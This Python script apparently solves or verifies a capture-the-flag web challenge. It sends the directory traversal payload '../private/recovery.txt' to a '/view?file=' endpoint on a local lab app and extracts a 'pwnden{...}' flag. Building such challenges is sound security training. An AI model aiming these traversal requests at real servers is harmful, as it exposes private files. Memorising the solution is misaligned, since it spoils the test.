import re
from urllib.error import HTTPError
from urllib.parse import urlencode
from urllib.request import urlopen


def get(path):
    try:
        with urlopen('http://app:8000' + path, timeout=5) as response:
            return response.status, response.read().decode()
    except HTTPError as error:
        return error.code, error.read().decode()


def view(name):
    return get('/view?' + urlencode({'file': name}))


def solve():
    assert 'pwnden{' not in get('/')[1]
    assert view('welcome.txt')[0] == 200
    assert 'private/' in view('guide.txt')[1]
    status, body = view('../private/recovery.txt')
    if status == 403:
        raise SystemExit(3)
    assert status == 200
    match = re.search(r'pwnden\{[0-9a-f]{32}\}', body)
    assert match
    assert view('./../private/recovery.txt')[1] == body
    print(match[0])


if __name__ == '__main__':
    solve()
